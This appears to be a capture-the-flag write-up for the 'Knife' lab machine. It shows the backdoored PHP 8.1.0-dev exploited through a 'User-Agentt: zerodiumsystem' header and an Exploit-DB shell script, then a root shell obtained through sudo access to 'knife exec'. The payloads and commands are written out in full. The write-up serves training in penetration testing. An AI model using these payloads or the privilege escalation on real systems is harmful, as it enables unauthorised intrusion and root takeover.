**Knife** is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP: **PHP/8.1.0-dev**. 
This vulnerability is leveraged to obtain the foothold on the server. 
A **sudo** misconfiguration is then exploited to gain a root shell.

# Zerodium exploit
An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021.
Two malicious commits were pushed to the php-src repo from the names of Rasmus Lerdorf and Nikita Popov. Everything pointed towards a compromise of the git.php.net server.
These are the two malicious commits.
[https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d)
[https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)

This indicates that an attacker can execute arbitrary code by sending the `User-Agentt` header. 
To exploit manually, just pass the another header:
```html
User-Agentt: zerodiumsystem(whoami);
```

Or you can use the following exploit uses the backdoor to provide a pseudo shell on the host.
[https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933) 
```bash
$ python3 49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can't acces tty; job crontol turned off.
$ whoami
james
```

# Privesc with Knife utility
Checking out `sudo` permissions for user james shows some tool called `knife`. 
```bash
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
- `knife --help` gives us a lot of options which can be helpful, most lucrative of all is `exec`:

```bash
$ knife --help

Chef Infra Client: 16.10.8
Docs: https://docs.chef.io/workstation/knife/
[..snip..]
		
** EXEC COMMANDS **
knife exec [SCRIPT] (options)

[..snip..]
```
- `--help` does not specify which script it runs, which is clearly mentioned in their documentation online: [https://docs.chef.io/workstation/knife_exec](https://docs.chef.io/workstation/knife_exec)

> _"Use the knife exec subcommand to execute Ruby scripts in the context of a fully configured Chef Infra Client. This subcommand has the following options: ``-E CODE, --exec CODE`` A string of code to be executed."_

There are three ways to use knife exec to run Ruby script files. For example:
```knife exec /path/to/script_file```
or:
```knife exec -E 'RUBY CODE'```

- Grab a stabilized shell using `id_rsa` in `/home/james/.ssh/id_rsa` or a reverse-shell.
```bash
$ sudo /usr/bin/knife exec -E 'system("/bin/bash -pi")'
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
root@knife:/# 
```
